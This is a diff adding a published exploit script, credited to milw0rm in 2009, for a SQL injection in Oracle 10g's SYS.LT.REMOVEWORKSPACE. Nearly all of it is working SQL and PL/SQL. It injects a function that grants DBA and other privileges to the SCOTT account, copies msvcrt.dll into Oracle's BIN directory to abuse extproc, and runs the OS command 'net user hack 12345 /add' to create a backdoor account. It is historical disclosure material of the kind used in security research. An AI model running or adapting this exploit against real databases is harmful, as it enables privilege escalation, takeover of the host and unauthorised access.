@@ -1,0 +1,75 @@
+/*********************************************************/
+/*Oracle 10g SYS.LT.REMOVEWORKSPACE SQL Injection Exploit*/
+/****grant DBA and create new  OS user (advanced extproc)*/
+/*********************************************************/
+/***********exploit grant DBA to scott********************/
+/***********and execute OS command "net user"*************/
+/***********using advanced extproc method*****************/
+/*********************************************************/
+/***********tested on oracle 10.1.0.5.0*******************/
+/*********************************************************/
+/*********************************************************/
+/* Date of Public EXPLOIT: January 6, 2009               */
+/* Written by:             Alexandr "Sh2kerr" Polyakov   */
+/* email:                  Alexandr.Polyakov@dsec.ru     */
+/* site:                   http://www.dsecrg.ru          */
+/*			   http://www.dsec.ru            */
+/*********************************************************/
+/*Original Advisory:                                     */
+/*Esteban Martinez Fayo [Team SHATTER ]                  */
+/*Date of Public Advisory: November 11, 2008             */
+/*http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml*/
+/*********************************************************/
+
+
+select * from user_role_privs;
+
+CREATE OR REPLACE FUNCTION X return varchar2
+authid current_user as
+pragma autonomous_transaction;
+BEGIN
+EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT';
+EXECUTE IMMEDIATE 'GRANT CREATE ANY DIRECTORY TO SCOTT';
+EXECUTE IMMEDIATE 'GRANT CREATE ANY LIBRARY TO SCOTT';
+EXECUTE IMMEDIATE 'GRANT EXECUTE ON SYS.DBMS_FILE_TRANSFER TO SCOTT';
+COMMIT;
+RETURN 'X';
+END;
+/
+
+exec SYS.LT.CREATEWORKSPACE('sh2kerr'' and SCOTT.X()=''X');
+exec SYS.LT.REMOVEWORKSPACE('sh2kerr'' and SCOTT.X()=''X');
+
+/* bypassing extproc limitation by copying msvcrt.dll to $ORACLE_HOME\BIN */
+/* this method works in 10g and 11g database versions with updates        */
+
+CREATE OR REPLACE DIRECTORY copy_dll_from AS 'C:\Windows\system32';
+CREATE OR REPLACE DIRECTORY copy_dll_to AS   'C:\Oracle\product\10.1.0\db_1\BIN';
+
+BEGIN
+  SYS.DBMS_FILE_TRANSFER.COPY_FILE(
+   source_directory_object      => 'copy_dll_from',
+   source_file_name             => 'msvcrt.dll',
+   destination_directory_object => 'copy_dll_to',
+   destination_file_name        => 'msvcrt.dll');
+END;
+/
+
+CREATE OR REPLACE LIBRARY extproc_shell AS 'C:\Oracle\product\10.1.0\db_1\bin\msvcrt.dll';
+/
+
+CREATE OR REPLACE PROCEDURE extprocexec (cmdstring IN CHAR)
+IS EXTERNAL
+NAME "system"
+LIBRARY extproc_shell
+LANGUAGE C;
+/
+
+/* here we can paste any OS command for example create new user */
+
+EXEC extprocexec('net user hack 12345 /add');
+/
+
+select * from user_role_privs;
+
+// milw0rm.com [2009-01-06]
